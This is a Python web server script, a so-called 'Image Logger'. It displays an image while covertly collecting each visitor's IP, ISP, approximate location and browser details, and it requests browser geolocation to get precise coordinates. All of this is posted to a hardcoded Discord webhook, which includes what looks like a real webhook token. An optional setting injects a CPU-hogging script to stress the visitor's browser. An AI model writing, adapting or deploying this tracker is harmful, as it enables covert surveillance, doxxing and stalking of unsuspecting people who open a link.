import aiohttp
from aiohttp import web
import json
import httpagentparser

# ==== OPTIONS SECTION ====
options = {
    "accurate_location": True,   # Set True to enable browser geolocation, False to disable
    "browser_stress": False       # Set True to enable heavy JS simulation, False to disable
}

# ==== CONFIG ====
config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
    "username": "Image Logger",
    "color": 0x00FFFF,
}

# ==== REPORT FUNCTION ====
async def make_report(ip, useragent=None, lat=None, lon=None):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5) as resp:
                info = await resp.json()
        except Exception:
            info = {}

        os, browser = httpagentparser.simple_detect(useragent or "")

        payload = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Visitor Info",
                "color": config["color"],
                "description": f"""
**IP Info**
> IP: {info.get('query', 'Unknown')}
> ISP: {info.get('isp', 'Unknown')}
> ASN: {info.get('as', 'Unknown')}
> Country: {info.get('country', 'Unknown')}
> Region: {info.get('regionName', 'Unknown')}
> City: {info.get('city', 'Unknown')}
> Coords (IP-based): {info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}
> VPN/Proxy: {info.get('proxy', 'Unknown')}

**Precise Location (if allowed)**
> Latitude: {lat or 'Unknown'}
> Longitude: {lon or 'Unknown'}

**PC Info**
> OS: {os}
> Browser: {browser}

**User Agent**
{useragent or 'Unknown'}
"""
            }]
        }

        try:
            await session.post(config["webhook"], json=payload, timeout=5)
        except Exception:
            pass

# ==== HANDLE IMAGE PAGE ====
async def handle_image(request):
    client_ip = request.remote
    useragent = request.headers.get('User-Agent', '')

    # Log IP & user-agent asynchronously
    await make_report(client_ip, useragent)

    # Heavy JS code only added if browser_stress is True
    heavy_js = ""
    if options["browser_stress"]:
        heavy_js = """
<script>
// Heavy computation to simulate browser stress
for (let i = 0; i < 1e9; i++) { Math.sqrt(i); }
</script>
"""

    # Geolocation JS only if accurate_location is True
    geo_js = ""
    if options["accurate_location"]:
        geo_js = """
<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        function(position) {
            fetch('/log_location', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            });
        },
        function(error) {
            console.log('Location access denied or unavailable.');
        }
    );
}
</script>
"""

    html_content = f"""
<html>
<head><title>Image</title></head>
<body>
<img src="{config['image']}" style="width:100%;height:auto;">
{geo_js}
{heavy_js}
</body>
</html>
"""
    return web.Response(text=html_content, content_type='text/html')

# ==== HANDLE LOCATION POSTS ====
async def handle_location(request):
    try:
        data = await request.json()
        lat = data.get('lat')
        lon = data.get('lon')
        client_ip = request.remote
        useragent = request.headers.get('User-Agent', '')
        await make_report(client_ip, useragent, lat, lon)
    except:
        pass
    return web.Response(text="OK")

# ==== APP SETUP ====
app = web.Application()
app.router.add_get('/', handle_image)
app.router.add_post('/log_location', handle_location)

if __name__ == '__main__':
    web.run_app(app, port=8080)
